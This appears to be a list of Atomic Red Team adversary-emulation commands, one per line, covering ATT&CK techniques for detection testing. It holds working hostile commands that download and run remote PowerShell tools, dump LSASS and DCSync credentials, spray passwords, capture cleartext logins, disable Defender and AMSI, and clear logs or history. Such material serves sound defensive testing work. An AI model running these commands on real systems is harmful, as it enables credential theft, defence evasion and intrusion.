openssl genrsa -out #{key_filename} 4096&&openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}&&cp #{cert_filename} /etc/pki/ca-trust/source/anchors/&&update-ca-trust
Test-NetConnection -ComputerName #{domain} -port #{port}
invoke-expression 'cmd /c start powershell -Command {cmd /c "#{TorExe}"}';sleep -s 60;stop-process -name "tor" | out-null
Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
sudo -l      &&sudo cat /usr/local/etc/sudoers&&sudo ee /usr/local/etc/sudoers
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -Value "<script>"
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');oldchecks -noninteractive -consoleoutput
New-Item #{commandpath} -Force | Out-Null;New-ItemProperty -Path #{commandpath} -Name "DelegateExecute" -Value "" -Force | Out-Null;Set-ItemProperty -Path #{commandpath} -Name "(default)" -Value "#{commandtorun}" -Force -ErrorAction SilentlyContinue | Out-Null;$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;. "#{test_harness}";;$InstallerAssemblyDir = "#{assembly_dir}";$InstallerAssemblyFileName = "#{assembly_filename}";$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName;;$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=install `"$InstallerAssemblyFullPath`"";$ExpectedOutput = 'Constructor_Install_';;$TestArgs = @{;    OutputAssemblyDirectory = $InstallerAssemblyDir;    OutputAssemblyFileName = $InstallerAssemblyFileName;    InvocationMethod = '#{invocation_method}';    CommandLine = $CommandLine;};;$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs;;if ($ActualOutput -ne $ExpectedOutput) {;    throw @";InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.;Expected: $ExpectedOutput;Actual: $ActualOutput;"@;}
@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
export HISTSIZE=0&&#{evil_command}
net groups "Account Operators" /doma;net groups "Exchange Organization Management" /doma;net group "BUILTIN\Backup Operators" /doma;net group /domai "Domain Admins"
$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
Import-Module -Name AzureAD;$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword;Connect-AzureAD -Credential $Credential;;$sp = Get-AzureADServicePrincipal -Filter "DisplayName eq '#{service_principal_name}'";if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit };$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'";if ($role -eq $null) { Write-Warning "Role not found"; exit };Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId;Write-Host "Service Principal $($sp.DisplayName) was added to $($role.DisplayName)"
certutil -addstore my #{pfx_path}
vaultcmd /listcreds:"Windows Credentials" /all
#{mwcpath}\#{mwcname} "#{xml_payload}" output.txt
cmd /r cmd<"#{input_file}"
password=$(openssl passwd -1 art)&&([ "$(uname)" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))&&su art -c "whoami; exit"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)";Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
cat /etc/login.defs
cd "PathToAtomicsFolder\..\ExternalPayloads";.\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1 
bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /t REG_DWORD /d 1 /f
reboot
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;. "#{test_harness}";;$InstallerAssemblyDir = "#{assembly_dir}";$InstallerAssemblyFileName = "#{assembly_filename}";$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName;;$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `"$InstallerAssemblyFullPath`"";$ExpectedOutput = 'Constructor_Uninstall_';;$TestArgs = @{;    OutputAssemblyDirectory = $InstallerAssemblyDir;    OutputAssemblyFileName = $InstallerAssemblyFileName;    InvocationMethod = '#{invocation_method}';    CommandLine = $CommandLine;};;$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs;;if ($ActualOutput -ne $ExpectedOutput) {;    throw @";InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.;Expected: $ExpectedOutput;Actual: $ActualOutput;"@;}
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f;schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
"#{procdump_exe}" -accepteula -ma lsass.exe #{output_file}
if [ "$(sysctl -n hw.hv_vendor)" != "" ]; then echo "Virtualization Environment detected"; fi
Start-Process "#{webbrowserpassview_path}";Start-Sleep -Second 4;Stop-Process -Name "WebBrowserPassView"
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
echo Password1> passwords.txt;echo 1q2w3e4r>> passwords.txt;echo Password!>> passwords.txt;echo Spring2022>> passwords.txt;echo ChangeMe!>> passwords.txt;@FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f
TEST=$(echo $HISTFILE)&&echo $HISTFILE&&export HISTFILE="/dev/null"&&if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; fi&&# -> $HISTFILE is /dev/null
ip tcp_metrics show |grep --invert-match "^127\."
ENCODED=$(echo '#{message}' | xxd -ps -c 256)&&printf $ENCODED | xxd -r -p&&echo $ENCODED | xxd -r -p&&echo $(echo $ENCODED) | xxd -r -p&&echo $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}&&echo $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}&&echo $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p&&echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p
cmd.exe /c "wmic 	csproduct 	get UUID" ;cmd.exe /c "fsutil behavior 	set SymlinkEvaluation R2L:1" ;cmd.exe /c "fsutil behavior set 	SymlinkEvaluation R2R:1";reg    add    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      ;copy "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" $env:temp;cmd.exe /c "$env:temp\psexec.exe  -accepteula  \\#{targethost} cmd.exe  /c echo "--access-token""
$fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs";$fname1 = "$env:TEMP\procexp.exe";if (Test-Path $fname) {;  Remove-Item $fname;  Remove-Item $fname1;};;$xlApp = New-Object -COMObject "Excel.Application";$xlApp.Visible = $True;$xlApp.DisplayAlerts = $False;$xlBook = $xlApp.Workbooks.Add();$sheet = $xlBook.Excel4MacroSheets.Add();;if ("#{uname}" -ne "") {;  $sheet.Cells.Item(1,1) = "#{uname}";} else {;  $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)";};;$sheet.Cells.Item(2,1) = "procexp.exe";$sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs";$sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)";$sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)";$sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"#{download_url}`"`"`")";$sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")";$sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")";$sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")";$sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")";$sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")";$sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")";$sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")";$sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")";$sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")";$sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")";$sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")";$sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")";$sheet.Cells.Item(19,1) = "=FCLOSE(A5)";$sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")";$sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")";$sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")";$sheet.Cells.Item(23,1) = "=HALT()";$sheet.Cells.Item(1,1).Name = "runme";$xlApp.Run("runme");$xlApp.Quit();;[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null;[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null;[System.GC]::Collect();[System.GC]::WaitForPendingFinalizers();;Remove-Variable xlBook;Remove-Variable xlApp
find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {} >> #{output_file} \;&&cat #{output_file} 2>/dev/null
sudo unlink #{system_log_path}
netsh advfirewall firewall add rule name="atomic testing" action=allow dir=in protocol=TCP localport=450 
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
shutdown -r #{timeout}
New-PSSession -ComputerName #{hostname_to_connect};Test-Connection $env:COMPUTERNAME;Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use";Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use;Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
vaultcmd /listcreds:"Windows Credentials"
Set-Location "PathToAtomicsFolder";.\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
Enable-PSRemoting -Force
chmod #{numeric_mode} #{file_or_folder}
echo "[Unit]" > #{path_to_systemd_service}&&echo "Description=Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_service}&&echo "[Service]" >> #{path_to_systemd_service}&&echo "Type=simple" >> #{path_to_systemd_service}&&echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> #{path_to_systemd_service}&&echo "[Install]" >> #{path_to_systemd_service}&&echo "WantedBy=multi-user.target" >> #{path_to_systemd_service}&&echo "[Unit]" > #{path_to_systemd_timer}&&echo "Description=Executes Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_timer}&&echo "Requires=#{systemd_service_name}" >> #{path_to_systemd_timer}&&echo "[Timer]" >> #{path_to_systemd_timer}&&echo "Unit=#{systemd_service_name}" >> #{path_to_systemd_timer}&&echo "OnCalendar=*-*-* *:*:00" >> #{path_to_systemd_timer}&&echo "[Install]" >> #{path_to_systemd_timer}&&echo "WantedBy=timers.target" >> #{path_to_systemd_timer}&&systemctl start #{systemd_timer_name}&&systemctl enable #{systemd_timer_name}&&systemctl daemon-reload
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
#{curl_path} -s -A "HttpBrowser/1.0" -m3 #{domain} >nul 2>&1;#{curl_path} -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >nul 2>&1;#{curl_path} -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >nul 2>&1;#{curl_path} -s -A "*<|>*" -m3 #{domain} >nul 2>&1
if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];&&then&&  service cbdaemon stop&&  chkconfig off cbdaemon&&else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];&&  systemctl stop cbdaemon&&  systemctl disable cbdaemon&&fi
echo $HISTSIZE&&export HISTSIZE=0&&if [ $(echo $HISTSIZE) -eq 0 ]; then echo "\$HISTSIZE is zero"; fi&&# -> $HISTSIZE is zero
New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" -Force;Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "DllName" "#{binary_to_execute}" -Type ExpandString -Force;Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Logon" "#{function_to_execute}" -Force;Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Impersonate" 1 -Type DWord -Force;Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force
chmod #{symbolic_mode} #{file_or_folder}
Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1";Get-NetDomainTrust;Get-NetForestTrust;Get-ADDomain;Get-ADGroupMember Administrators -Recursive;([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
cp -v /etc/pam.d/sshd /tmp/&&echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" >> /etc/pam.d/sshd&&systemctl restart sshd&&systemctl restart auditd&&ssh #{user_account}@localhost &&whoami&&sudo su&&whoami&&exit&&exit
set-WebConfigurationProperty -PSPath "IIS:\Sites\#{website_name}\" -filter "system.webServer/httpLogging" -name dontLog -value $true
reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f
Get-WMIObject Win32_Group
if (!(Test-Path -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){;  New-Item -ItemType Key -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run";};Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}" -Value "#{payload}"
Mount-DiskImage -ImagePath "#{path_of_iso}"
service syslogd stop&&sysrc syslogd_enable="NO"
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} "#{input_file}"
chown -R #{owner}:#{group} #{file_or_folder}
reg query HKLM /f password /t REG_SZ /s;reg query HKCU /f password /t REG_SZ /s
Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "PathToAtomicsFolder\..\ExternalPayloads\Edge" -Force -Recurse
sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ  /d "C:\Users\admin\AppData\Roaming\Install\Host.exe" /f;reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f;reg add HKCU\SOFTWARE\NetWire /v "Install Date" /t REG_SZ /d "2021-08-30 07:17:27" /f
touch -m -t 197001010000.00 #{target_filename}
Get-Date
Remove-SmbShare -Name #{share_name};Remove-FileShare -Name #{share_name}
Set-ExecutionPolicy -Scope Process Bypass -Force;$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}};& "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}
test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoRebootWithLoggedOnUsers" /t REG_DWORD /d 1 /f
chcp
& "PathToAtomicsFolder\T1090.003\src\Psiphon.bat"
$credFile = "#{cred_file}";if (Test-Path $credFile) {;    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){;      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1;    };    try {;        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force;        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;    };    catch { ;        $_.Exception;        $errCode = $_.Exception.ErrorCode;        Write-Host "Error code: $errCode";        if ($errCode -eq 86) {;            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials";            Remove-Item $credFile;        };        exit $errCode;    };    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}";    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force));    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile;};else {;    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first";}
networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}&&networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
$logs = Get-EventLog -List | ForEach-Object {$_.Log};$logs | ForEach-Object {Clear-EventLog -LogName $_ };Get-EventLog -list
sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
mkdir #{file_or_folder} >nul 2>&1;echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt;echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt;attrib.exe +h #{file_or_folder}\T1222.001_attrib1.txt;attrib.exe +h #{file_or_folder}\T1222.001_attrib2.txt
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f;reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art1 /d "regedit.exe";reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art2 /d "cmd.exe"
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"
sudo tcpdump -c 5 -nnni #{interface}    &&if [ -x "$(command -v tshark)" ]; then sudo tshark -c 5 -i #{interface}; fi;
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32";$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER;$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy";Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue;$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore;$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore;$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore;$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore;$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore;echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
defaults write com.apple.finder AppleShowAllFiles YES
rm -f #{file_to_delete}
$target = $env:LOGONSERVER;$target = $target.Trim("\\");$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString;wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]"'
echo "test" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value "test";set-content -path #{file_name} -stream #{ads_filename} -value "test2";set-content -path . -stream #{ads_filename} -value "test3"
copy C:\Windows\System32\cmd.exe C:\lsm.exe;C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f
$address = (& "$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe" "$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\" | Out-String | Select-String -Pattern "VirtualAddress: (\w+)").Matches.Groups[1].Value;& "PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe" "#{vuln_dll}" $address
del %TEMP%\redcanary.cab >nul 2>&1;#{Path_replace} #{replace_cab} %TEMP% /A
gcc #{input_file} && ./a.out&&clang #{input_file} && ./a.out
if [ $USER == "root" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
mkdir #{output_folder}&&find #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \;
$Action = New-ScheduledTaskAction -Execute "cmd.exe";$Trigger = New-ScheduledTaskTrigger -AtLogon;$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest;$Set = New-ScheduledTaskSettingsSet;$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set;Register-ScheduledTask AtomicTaskModifed -InputObject $object;$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe";Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction
wmic process call create #{process_to_execute}
Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
$input_table = "#{parent_list}".split(",");$Name = "Debugger";$Value = "#{attached_process}";Foreach ($item in $input_table){;  $item = $item.trim();  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item";  IF(!(Test-Path $registryPath));  {;    New-Item -Path $registryPath -Force;    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force;  };  ELSE;  {;    New-ItemProperty -Path $registryPath -Name $name -Value $Value;  };}
Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Gui" -NoRestart -ErrorAction Ignore;Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Features" -NoRestart -ErrorAction Ignore;Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender" -NoRestart -ErrorAction Ignore;Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard" -NoRestart -ErrorAction Ignore
mkdir #{output_folder}&&find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \;
screencapture -x #{output_file}
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');otherchecks -noninteractive -consoleoutput
if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {;    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki;    };Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d 10 /f;reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d 10 /f
if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;&&if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;&&sudo touch /tmp/password-auth.bk&&sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so&&enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so&&enable=* log_password" >> /etc/pam.d/system-auth
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=group) #{optional_args}
"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 4
echo 1> /proc/sys/kernel/sysrq &&echo b> /proc/sysrq-trigger 
$xml = [System.IO.File]::ReadAllText("#{xml_path}");Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
if [ -f "/etc/#{syslog_config_file_name}" ];&&then sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}&&fi&&if [ -f "/etc/#{rsyslog_config_file_name}" ];&&then sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}&&fi&&if [ -f "/etc/syslog-ng/#{syslog_ng_config_file_name}" ];&&then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}&&fi
sh #{script_path}&&PID=$(pgrep -n -f "#{pid_term}")&&PYTHON=$(which python || which python3 || which python2)&&$PYTHON #{python_script} $PID #{output_file}&&grep -i "PASS" "#{output_file}"
#{mimikatz_path} "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}" "exit"
sudo #{program_path} -4 -p 6 -t 3
#{flavor_command}
Get-ChildItem "#{file_path}" | % { $_.LastWriteTime = "#{target_date_time}" }
nmap #{host_to_scan}
driverquery /v;driverquery /si
C:\Windows\System32\inetsrv\appcmd.exe list apppool /config
$imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe";& $imewdbled #{remote_url}
reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f;reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f
arp -a | grep -v '^?'
"#{Path_to_file}" 1>NUL 
